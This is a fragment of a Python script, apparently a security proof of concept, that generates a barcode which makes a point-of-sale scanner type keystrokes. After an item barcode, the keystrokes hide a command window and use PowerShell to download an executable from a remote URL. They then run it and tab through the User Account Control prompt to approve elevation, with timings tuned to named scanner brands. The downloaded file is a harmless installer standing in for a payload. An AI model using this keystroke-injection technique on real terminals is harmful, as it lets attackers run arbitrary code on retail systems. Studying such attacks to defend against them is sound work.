...
POSEntry = '9780517149256'+Enter # Item barcode for the POS software
...
# Add commands and control operations to minimize the command-line window and download the file
TxString = (TxString +
            'echo off'+Enter+ # Echo off
            'mode con:cols=18lines=1'+Enter+ # Minimize the command-line window
            "powershell -command \" & { (New-Object Net.WebClient).DownloadFile('https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.1.4/npp.8.1.4.Installer.x64.exe', 'np.exe') }\""+
            Enter) # Start file download

# Add delay, waiting for the file to download
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    TxString = TxString + Ins * (30 * 8)
else: TxString = TxString + Ins * (120 * 8)

# Add commands to run the file
TxString = (TxString +
            'np'+Enter+ # Run the file
            'exit'+Enter) # Exit the command-line window

# Add delay, waiting for the User Account Control window to take control
if (ControlCodes.upper() == "HONEYWELL") | (ControlCodes.upper() == "EYOYO"):
    TxString = TxString + Ins * (18 * 8)
else: TxString = TxString + Ins * (60 * 8)

# Add Press Tab two times at User Account Control to get to "Yes"
TxString = (TxString +
            Tab+Tab+Enter)
...
draw.text((0, 0), ControlCodes + ':' + 'Download file with CMD and PS with POS entry',fill = 'black', font = font)
